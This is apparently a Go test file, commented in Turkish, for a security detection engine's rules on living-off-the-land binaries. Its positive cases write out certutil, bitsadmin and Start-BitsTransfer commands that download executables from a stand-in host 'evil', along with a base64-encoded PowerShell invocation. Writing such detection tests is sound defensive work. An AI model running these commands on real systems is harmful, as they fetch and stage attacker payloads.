package detect

import (
	"testing"

	"kut.corp/suite/server/internal/model"
)

func findDet(dets []Detection, id string) (Detection, bool) {
	for _, d := range dets {
		if d.RuleID == id {
			return d, true
		}
	}
	return Detection{}, false
}

// TestLOLBinDepthRules, LOLBin indirme/çözme/gizleme derinlik kurallarının (KUT-0032
// certutil/T1140, KUT-0033 BITS/T1197, KUT-0034 kodlanmış-komut/T1027) doğru teknik+
// önem düzeyiyle tetiklendiğini doğrular. Mesajlar KUT-0007'nin KAÇIRDIĞI varyantları
// seçer (certutil -decode, bitsadmin, -ec kısa biçim) → doğru atıf + kapsam kazanımı.
func TestLOLBinDepthRules(t *testing.T) {
	e := NewEngine(nil)
	cases := []struct {
		msg, rule, tech string
	}{
		{`certutil.exe -decode payload.b64 payload.exe`, "KUT-0032", "T1140"},
		{`certutil -urlcache -split -f http://evil/x.exe x.exe`, "KUT-0032", "T1140"},
		{`bitsadmin /transfer job http://evil/x.exe c:\x.exe`, "KUT-0033", "T1197"},
		{`Start-BitsTransfer -Source http://evil/x.exe -Destination c:\x.exe`, "KUT-0033", "T1197"},
		{`powershell.exe -ec aGVsbG8gd29ybGQgdGhpcyBpcyBiYXNlNjQgZXZhc2lvbg==`, "KUT-0034", "T1027"},
	}
	for _, c := range cases {
		dets := e.Evaluate(model.Event{Message: c.msg})
		d, ok := findDet(dets, c.rule)
		if !ok {
			t.Errorf("%q → %s tespiti bekleniyordu, dets=%+v", c.msg, c.rule, dets)
			continue
		}
		if d.Technique.ID != c.tech || d.Severity != "HIGH" {
			t.Errorf("%q → %s teknik=%s sev=%s (beklenen %s/HIGH)", c.msg, c.rule, d.Technique.ID, d.Severity, c.tech)
		}
	}
}

// TestLOLBinDepthFalsePositiveGuards, meşru/benzer-ama-zararsız komutların derinlik
// kurallarını tetiklemediğini doğrular (FP koruması).
func TestLOLBinDepthFalsePositiveGuards(t *testing.T) {
	e := NewEngine(nil)
	negatives := []string{
		`powershell.exe -ExecutionPolicy Bypass -File C:\scripts\backup.ps1`, // -e... ama base64 kuyruğu yok
		`certutil -hashfile payload.exe SHA256`,                              // certutil ama decode/urlcache-f değil
		`operatör bitsadmin kullanımını dokümantasyonda inceledi`,            // bitsadmin geçiyor ama /transfer vb. yok
	}
	for _, msg := range negatives {
		dets := e.Evaluate(model.Event{Message: msg})
		for _, id := range []string{"KUT-0032", "KUT-0033", "KUT-0034"} {
			if _, ok := findDet(dets, id); ok {
				t.Errorf("FP: %q %s tetiklememeliydi (dets=%+v)", msg, id, dets)
			}
		}
	}
}
